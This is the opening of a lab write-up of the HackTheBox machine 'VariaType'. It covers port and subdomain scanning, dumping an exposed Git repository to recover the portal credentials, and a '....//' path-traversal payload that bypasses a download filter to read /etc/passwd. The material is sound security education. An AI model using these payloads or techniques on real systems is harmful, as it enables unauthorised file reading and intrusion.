---
maquina: "VariaType"
dificultad: "Medium"
os: "Linux"
plataforma: "htb"
release: "14 Mar 2026"
retire: "13 Jun 2026"
creadores: "WackyH4cker"
htb_url: "https://hackthebox.com/machines/variatype"
app_url: "https://app.hackthebox.com/machines/850"
url: "https://0xdf.gitlab.io/2026/06/13/htb-variatype.html"
tipo: "htb"
en_lista_oscp: false
oscp_seccion: ""
---

VariaType hosts a pair of websites for a font foundry, a Flask-based font generator and a PHP validation portal. I’ll recover the portal’s source from an exposed Git repository to get credentials, and then abuse a single-pass filter bypass in its download feature to read files off the host. With the Flask application’s source in hand, I’ll exploit an arbitrary file write in fontTools’ variable font generation to drop a PHP webshell and get a foothold. A cron job validates uploaded fonts with an outdated FontForge build, which I’ll exploit through command injection in a malicious archive’s filenames to pivot to the next user. Finally, I’ll abuse a sudo-allowed plugin installer that downloads files with a vulnerable version of setuptools, using a path traversal in its PackageIndex to write an SSH key to root’s home directory.

## Recon

### Initial Scanning

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```console
oxdf@hacky$ sudo nmap -p- --reason --min-rate 10000 10.129.244.202
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-06 20:58 UTC
Nmap scan report for 10.129.244.202
Host is up, received reset ttl 63 (0.021s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Nmap done: 1 IP address (1 host up) scanned in 7.32 seconds
oxdf@hacky$ sudo nmap -p 22,80 -sCV 10.129.244.202
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-06 21:00 UTC
Nmap scan report for 10.129.244.202
Host is up (0.021s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 e0:b2:eb:88:e3:6a:dd:4c:db:c1:38:65:46:b5:3a:1e (ECDSA)
|_  256 ee:d2:bb:81:4d:a2:8f:df:1c:50:bc:e1:0e:0a:d1:22 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Did not follow redirect to http://variatype.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.01 seconds
```

Based on the [OpenSSH and Nginx](https://0xdf.gitlab.io/cheatsheets/os#debian) versions, the host is likely running Debian 12 Bookworm.

Both of the ports show a TTL of 63, which matches the [expected TTL](https://0xdf.gitlab.io/cheatsheets/os#os-identification) for Linux one hop away.

### Subdomain Bruteforce - TCP 80

There’s a redirect to `variatype.htb` on port 80. I’ll use `ffuf` to bruteforce for subdomains that respond differently, and it finds one:

```console
oxdf@hacky$ ffuf -u http://10.129.244.202 -H "Host: FUZZ.variatype.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.244.202
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.variatype.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

portal                  [Status: 200, Size: 2494, Words: 445, Lines: 59, Duration: 29ms]
:: Progress: [19966/19966] :: Job [1/1] :: 1980 req/sec :: Duration: [0:00:11] :: Errors: 0 ::
```

I’m using `-ac` to filter out default cases (see [my YouTube video](https://www.youtube.com/watch?v=scHcQIDHcsc) about how that works).

I’ll add both the domain and subdomain to my `hosts` file:

```plaintext
10.129.244.202 variatype.htb portal.variatype.htb
```

I’ll rerun `nmap` with `-sCV` targeting each hostname, and on `portal.variatype.htb` it identifies a `.git` repo publicly available:

```console
oxdf@hacky$ sudo nmap -p 22,80 -sCV portal.variatype.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-06 21:08 UTC
Nmap scan report for portal.variatype.htb (10.129.244.202)
Host is up (0.021s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 e0:b2:eb:88:e3:6a:dd:4c:db:c1:38:65:46:b5:3a:1e (ECDSA)
|_  256 ee:d2:bb:81:4d:a2:8f:df:1c:50:bc:e1:0e:0a:d1:22 (ED25519)
80/tcp open  http    nginx 1.22.1
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: nginx/1.22.1
|_http-title: VariaType \xE2\x80\x94 Internal Validation Portal
| http-git:
|   10.129.244.202:80/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: security: remove hardcoded credentials
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.91 seconds
```

This is one of the main reasons I rerun `nmap`, as the wordlists I typically run with `feroxbuster` by default don’t check for this. I’ll dig into this more when I get to that host.

### variatype.htb - TCP 80

#### Site

The site is for a company that creates fonts:

![image-20260606171356030](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260606171356030.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

The “Services” link has a page with some details about the tooling they use:

![image-20260606171628837](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260606171628837.png)

At the bottom there’s a button that says “Email Us” that links to `studio@variabype.labs`.

The “Tools” link and the “Generate Font” button at the top right both lead to `/tools/variable-font-generator`:

![image-20260606171738199](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260606171738199.png)

It takes a `.designspace` file and a `.ttf` or `.otf` file, and says it will generate a “variable font”. Based on the list of tools named on the website, I can reasonably guess that this is taking the provided files and passing them to `fonttools`.

[robotfont.com](https://robofont.com/documentation/tutorials/creating-designspace-files/) defines a `.designspace` file as:

> an XML-based description of a multi-dimensional interpolation space.

Claude describes it as:

> A .designspace file is an XML format used in variable font / typeface design workflows. It’s part of the font tooling ecosystem (used by tools like fontTools, fontmake, glyphsLib, and the DesignSpaceDocument library).

It also gave me an example file:

```xml
<designspace format="4.1">
  <axes>
    <axis tag="wght" name="weight" minimum="100" maximum="900" default="400"/>
  </axes>
  <sources>
    <source filename="Font-Thin.ufo" name="thin">
      <location><dimension name="weight" xvalue="100"/></location>
    </source>
    <source filename="Font-Black.ufo" name="black">
      <location><dimension name="weight" xvalue="900"/></location>
    </source>
  </sources>
  <instances>
    <instance name="Font Regular" filename="Font-Regular.ufo">
      <location><dimension name="weight" xvalue="400"/></location>
    </instance>
  </instances>
</designspace>
```

`.ttf` files are [TrueType files](https://en.wikipedia.org/wiki/TrueType):

> TrueType is an outline font standard developed by Apple in the late 1980s as a competitor to Adobe’s Type 1 fonts used in PostScript. It has become the most common format for fonts on the classic Mac OS, macOS, and Microsoft Windows operating systems.

`.otf` is [OpenType](https://en.wikipedia.org/wiki/OpenType):

> OpenType is a format for scalable computer fonts. Derived from TrueType, it retains TrueType’s basic structure but adds many intricate data structures for describing typographic behavior. OpenType is a registered trademark of Microsoft Corporation.

I’ll download a font from the internet (I picked [this one](https://www.dafont.com/super-pandora.font) as the first I saw) and upload the example `.designspace` file and the downloaded `.ttf` file. In this case it fails:

![image-20260606172844192](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260606172844192.png)

I always like to play with the intended functionality of the website, so I’ll create a `.designspace` file that references that font:

```xml
<designspace format="4.1">
  <axes>
    <axis tag="wght" name="weight" minimum="400" maximum="400" default="400"/>
  </axes>
  <sources>
    <source filename="Super Pandora.ttf" name="regular">
      <location><dimension name="weight" xvalue="400"/></location>
    </source>
  </sources>
</designspace>
```

This one works:

![image-20260606173052837](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260606173052837.png)

The download button leads to `/download/2GMzUwWoMk8`, which returns a file `MyVariableFont_2GMzUwWoMk8.ttf`.

#### Tech Stack

The HTTP response headers show only NGINX:

```http
HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Sat, 06 Jun 2026 21:13:11 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Content-Length: 2321
```

When I submit a post trying to create a font that fails, it does set a cookie:

```http
HTTP/1.1 302 FOUND
Server: nginx/1.22.1
Date: Sat, 06 Jun 2026 21:28:25 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 247
Connection: keep-alive
Location: /tools/variable-font-generator
Vary: Cookie
Set-Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsiZXJyb3IiLCJGb250IGdlbmVyYXRpb24gZmFpbGVkIGR1cmluZyBwcm9jZXNzaW5nLiJdfV19.aiSQ-Q.dcp-ch05mYa409jl7vI8LsJVz_Y; HttpOnly; Path=/
```

It’s three base64-encoded strings joined by dot. That could be a JWT, but it turns out to be a Flask cookie. [flask-unsign](https://github.com/Paradoxis/Flask-Unsign) will decode it:

```console
oxdf@hacky$ flask-unsign --decode -c eyJfZmxhc2hlcyI6W3siIHQiOlsiZXJyb3IiLCJGb250IGdlbmVyYXRpb24gZmFpbGVkIGR1cmluZyBwcm9jZXNzaW5nLiJdfV19.aiSQ-Q.dcp-ch05mYa409jl7vI8LsJVz_Y
{'_flashes': [('error', 'Font generation failed during processing.')]}
```

It is common in Flask applications using the `flash` utility from Flask to handle errors. It stores the error message as a cookie so that when the 302 redirect happens to the form page, it will read that cookie, and add the error message. After adding the message to the next page, it clears the cookie in the next response:

```http
HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Sat, 06 Jun 2026 21:28:25 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Vary: Cookie
Set-Cookie: session=; Expires=Thu, 01 Jan 1970 00:00:00 GMT; Max-Age=0; HttpOnly; Path=/
Content-Length: 2254
```

All of that is to say that this site is built on the Python Flask framework. The 404 page is also the [default Flask 404](https://0xdf.gitlab.io/cheatsheets/404#flask):

![image-20260606174730504](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260606174730504.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```console
oxdf@hacky$ feroxbuster -u http://variatype.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://variatype.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       65l      166w     2104c http://variatype.htb/tools/variable-font-generator
200      GET       84l      304w     3339c http://variatype.htb/services
200      GET      250l      501w     5030c http://variatype.htb/static/css/corporate.css
200      GET       60l      215w     2321c http://variatype.htb/
[####################] - 79s    30006/30006   0s      found:4       errors:1
[####################] - 79s    30000/30000   381/s   http://variatype.htb/
```

Nothing I haven’t already investigated.

### portal.variatype.htb

#### Site

The site on this virtual host presents a login page for the “Internal Validation Portal”:

![image-20260606174901050](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260606174901050.png)

If I try to guess a login, it returns a message of failure:

![image-20260606174939687](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260606174939687.png)

The message is the same for users that might exist and those that don’t, so it doesn’t seem to offer a way to validate usernames. The time for all users seems to be the same as well. That could mean that I am not able to guess any valid usernames, or that this isn’t a leak.

#### Tech Stack

On first visiting the site, the HTTP response sets a `PHPSESSID` cookie:

```http
HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Sat, 06 Jun 2026 21:48:15 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Set-Cookie: PHPSESSID=s9dsjfeksmfljp314j8n8jaj01; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 2494
```

That’s a good indication that this site is built on PHP. The 404 page is the [default nginx 404](https://0xdf.gitlab.io/cheatsheets/404#nginx):

![image-20260606175326562](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260606175326562.png)

The site also loads as `/index.php`.

#### Directory Brute Force

Typically I would skip the directory brute force since there’s an exposed `.git` directory, but it doesn’t have the full site source. I’ll run `feroxbuster` with `-x php` to look for PHP files as well:

```console
oxdf@hacky$ feroxbuster -u http://portal.variatype.htb -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://portal.variatype.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       11w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      369l      818w     8789c http://portal.variatype.htb/styles.css
200      GET       58l      200w     2494c http://portal.variatype.htb/
302      GET        0l        0w        0c http://portal.variatype.htb/download.php => http://portal.variatype.htb/
301      GET        7l       11w      169c http://portal.variatype.htb/files => http://portal.variatype.htb/files/
200      GET       58l      200w     2494c http://portal.variatype.htb/index.php
302      GET        0l        0w        0c http://portal.variatype.htb/view.php => http://portal.variatype.htb/
200      GET        0l        0w        0c http://portal.variatype.htb/auth.php
302      GET        0l        0w        0c http://portal.variatype.htb/dashboard.php => http://portal.variatype.htb/
[####################] - 27s    60004/60004   0s      found:8       errors:2
[####################] - 27s    30000/30000   1123/s  http://portal.variatype.htb/
[####################] - 27s    30000/30000   1128/s  http://portal.variatype.htb/files/
```

`/files` returns a 403 forbidden. `/auth.php` returns an empty page. `/view.php` and `/dashboard.php` both redirect to `/`, presumably because I need to be logged in to access them.

#### Portal Source

I’ll use [git-dumper](https://github.com/arthaud/git-dumper) to recover the directory. I find it’s easiest to run this tool from an empty directory:

```console
oxdf@hacky$ git-dumper http://portal.variatype.htb .
[-] Testing http://portal.variatype.htb/.git/HEAD [200]
[-] Testing http://portal.variatype.htb/.git/ [403]
[-] Fetching common files
[-] Fetching http://portal.variatype.htb/.gitignore [404]
[-] http://portal.variatype.htb/.gitignore responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/COMMIT_EDITMSG [200]
[-] Fetching http://portal.variatype.htb/.git/description [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/commit-msg.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/post-receive.sample [404]
[-] http://portal.variatype.htb/.git/hooks/post-receive.sample responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/hooks/post-commit.sample [404]
[-] http://portal.variatype.htb/.git/hooks/post-commit.sample responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/hooks/post-update.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/pre-commit.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/update.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/pre-receive.sample [200]
[-] Fetching http://portal.variatype.htb/.git/objects/info/packs [404]
[-] http://portal.variatype.htb/.git/objects/info/packs responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/hooks/pre-push.sample [200]
[-] Fetching http://portal.variatype.htb/.git/info/exclude [200]
[-] Fetching http://portal.variatype.htb/.git/index [200]
[-] Finding refs/
[-] Fetching http://portal.variatype.htb/.git/FETCH_HEAD [404]
[-] http://portal.variatype.htb/.git/FETCH_HEAD responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/HEAD [200]
[-] Fetching http://portal.variatype.htb/.git/ORIG_HEAD [200]
[-] Fetching http://portal.variatype.htb/.git/config [200]
[-] Fetching http://portal.variatype.htb/.git/logs/HEAD [200]
[-] Fetching http://portal.variatype.htb/.git/info/refs [404]
[-] http://portal.variatype.htb/.git/info/refs responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/heads/main [404]
[-] http://portal.variatype.htb/.git/logs/refs/heads/main responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/heads/master [200]
[-] Fetching http://portal.variatype.htb/.git/logs/refs/heads/staging [404]
[-] http://portal.variatype.htb/.git/logs/refs/heads/staging responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/heads/production [404]
[-] http://portal.variatype.htb/.git/logs/refs/heads/production responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/heads/development [404]
[-] http://portal.variatype.htb/.git/logs/refs/heads/development responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/remotes/origin/main [404]
[-] Fetching http://portal.variatype.htb/.git/logs/refs/remotes/origin/HEAD [404]
[-] http://portal.variatype.htb/.git/logs/refs/remotes/origin/HEAD responded with status code 404
[-] http://portal.variatype.htb/.git/logs/refs/remotes/origin/main responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/remotes/origin/master [404]
[-] http://portal.variatype.htb/.git/logs/refs/remotes/origin/master responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/remotes/origin/staging [404]
[-] http://portal.variatype.htb/.git/logs/refs/remotes/origin/staging responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/remotes/origin/production [404]
[-] http://portal.variatype.htb/.git/logs/refs/remotes/origin/production responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/remotes/origin/development [404]
[-] http://portal.variatype.htb/.git/logs/refs/remotes/origin/development responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/heads/main [404]
[-] Fetching http://portal.variatype.htb/.git/packed-refs [404]
[-] Fetching http://portal.variatype.htb/.git/logs/refs/stash [404]
[-] http://portal.variatype.htb/.git/refs/heads/main responded with status code 404
[-] http://portal.variatype.htb/.git/logs/refs/stash responded with status code 404
[-] http://portal.variatype.htb/.git/packed-refs responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/heads/master [200]
[-] Fetching http://portal.variatype.htb/.git/refs/heads/staging [404]
[-] http://portal.variatype.htb/.git/refs/heads/staging responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/heads/development [404]
[-] http://portal.variatype.htb/.git/refs/heads/development responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/heads/production [404]
[-] http://portal.variatype.htb/.git/refs/heads/production responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/remotes/origin/HEAD [404]
[-] http://portal.variatype.htb/.git/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/remotes/origin/master [404]
[-] Fetching http://portal.variatype.htb/.git/refs/remotes/origin/main [404]
[-] http://portal.variatype.htb/.git/refs/remotes/origin/master responded with status code 404
[-] http://portal.variatype.htb/.git/refs/remotes/origin/main responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/remotes/origin/production [404]
[-] Fetching http://portal.variatype.htb/.git/refs/remotes/origin/staging [404]
[-] http://portal.variatype.htb/.git/refs/remotes/origin/production responded with status code 404
[-] http://portal.variatype.htb/.git/refs/remotes/origin/staging responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/remotes/origin/development [404]
[-] http://portal.variatype.htb/.git/refs/remotes/origin/development responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/staging [404]
[-] http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/staging responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/stash [404]
[-] http://portal.variatype.htb/.git/refs/stash responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/main [404]
[-] http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/main responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/master [404]
[-] http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/master responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/production [404]
[-] http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/production responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/index/refs/heads/main [404]
[-] Fetching http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/development [404]
[-] http://portal.variatype.htb/.git/refs/wip/index/refs/heads/main responded with status code 404
[-] http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/development responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/index/refs/heads/staging [404]
[-] http://portal.variatype.htb/.git/refs/wip/index/refs/heads/staging responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/index/refs/heads/master [404]
[-] http://portal.variatype.htb/.git/refs/wip/index/refs/heads/master responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/index/refs/heads/production [404]
[-] http://portal.variatype.htb/.git/refs/wip/index/refs/heads/production responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/index/refs/heads/development [404]
[-] http://portal.variatype.htb/.git/refs/wip/index/refs/heads/development responded with status code 404
[-] Finding packs
[-] Finding objects
[-] Fetching objects
[-] Fetching http://portal.variatype.htb/.git/objects/50/30e791b764cb2a50fcb3e2279fea9737444870 [200]
[-] Fetching http://portal.variatype.htb/.git/objects/00/00000000000000000000000000000000000000 [404]
[-] http://portal.variatype.htb/.git/objects/00/00000000000000000000000000000000000000 responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/objects/61/5e621dce970c2c1c16d2a1e26c12658e3669b3 [200]
[-] Fetching http://portal.variatype.htb/.git/objects/75/3b5f5957f2020480a19bf29a0ebc80267a4a3d [200]
[-] Fetching http://portal.variatype.htb/.git/objects/6f/021da6be7086f2595befaa025a83d1de99478b [200]
[-] Fetching http://portal.variatype.htb/.git/objects/03/0e929d424a937e9bd079794a7e1aaf366bcfaf [200]
[-] Fetching http://portal.variatype.htb/.git/objects/c6/ea13ef05d96cf3f35f62f87df24ade29d1d6b4 [200]
[-] Fetching http://portal.variatype.htb/.git/objects/b3/28305f0e85c2b97a7e2a94978ae20f16db75e8 [200]
[-] Running git checkout .
```

When it’s done, there’s only a single file:

```console
oxdf@hacky$ ls -la
total 16
drwxrwxr-x  3 oxdf oxdf 4096 Jun  6 21:56 .
drwxr-x--- 68 oxdf oxdf 4096 Jun  6 21:55 ..
-rw-rw-r--  1 oxdf oxdf   36 Jun  6 21:56 auth.php
drwxrwxr-x  7 oxdf oxdf 4096 Jun  6 21:56 .git
```

`feroxbuster` did show `auth.php`, and the PHP is also uninspiring:

```php
<?php
session_start();
$USERS = [];
```

This does explain why visiting it directly returns an empty page.

The Git history is interesting:

```console
oxdf@hacky$ git log --oneline
753b5f5 (HEAD -> master) fix: add gitbot user for automated validation pipeline
5030e79 feat: initial portal implementation
```

`git diff` shows some creds removed (when the gitbot user was added?):

```console
oxdf@hacky$ git diff 5030e79 753b5f5
diff --git a/auth.php b/auth.php
index 615e621..b328305 100644
--- a/auth.php
+++ b/auth.php
@@ -1,3 +1,5 @@
 <?php
 session_start();
-$USERS = [];
+$USERS = [
+    'gitbot' => 'G1tB0t_Acc3ss_2025!'
+];
```

Regardless, these creds work to log into the portal.

#### Authenticated Site

`/dashboard.php` shows a very simple dashboard:

![image-20260606180607973](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260606180607973.png)

When I submit another successful generation request, another font shows up:

![image-20260606180646068](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260606180646068.png)

There must be some coordination between the two sites, which could be done via a shared database, or shared filesystem access.

The “View” link leads to some details about the file at `/view.php?f=variabype_PRIiuZ02BGo.ttf`:

![image-20260606180716925](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260606180716925.png)

The “Download” link uses `/download.php?f=variabype_PRIiuZ02BGo.ttf` to return the file.

## Shell as www-data

### File Read

Any time I see something like `/download.php?f=` I’ll want to check for directory traversal / file read, and because it’s PHP, local file include (LFI). I can manually check by sending the request to Burp Repeater. With `view.php` it trips some kind of validation:

![image-20260607072632479](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260607072632479.png)

But with `download.php`, it gives a different error:

![image-20260607072705477](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260607072705477.png)

This implies it’s trying to read the file but not finding it. If I try with the original filename, it returns:

![image-20260607072153102](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260607072153102.png)

The `../` are being removed. A common mistake on this kind of filtering is to make only a single pass through the string. For example, if the code looks like:

```php
$path = str_replace('../', '', $_GET['f']);
```

This would give the result above, but I can bypass it by sending in `....//`. When this goes through the filter, `../` will be removed, leaving `../`. I’ll try it here and it works:

![image-20260607072828540](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260607072828540.png)

Another way to find this is using the JHaddix LFI list in [SecLists](https://github.com/danielmiessler/SecLists):

```console
oxdf@hacky$ ffuf -u http://portal.variatype.htb/download.php?f=FUZZ -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -H "Cookie: PHPSESSID=ho2h7i774rt7abna4p13vme35b" -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://portal.variatype.htb/download.php?f=FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Header           : Cookie: PHPSESSID=ho2h7i774rt7abna4p13vme35b
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 20ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 20ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 20ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 20ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 21ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 21ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 21ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 21ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 22ms]
....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 20ms]
....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 21ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 22ms]
....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1234, Words: 7, Lines: 26, Duration: 21ms]
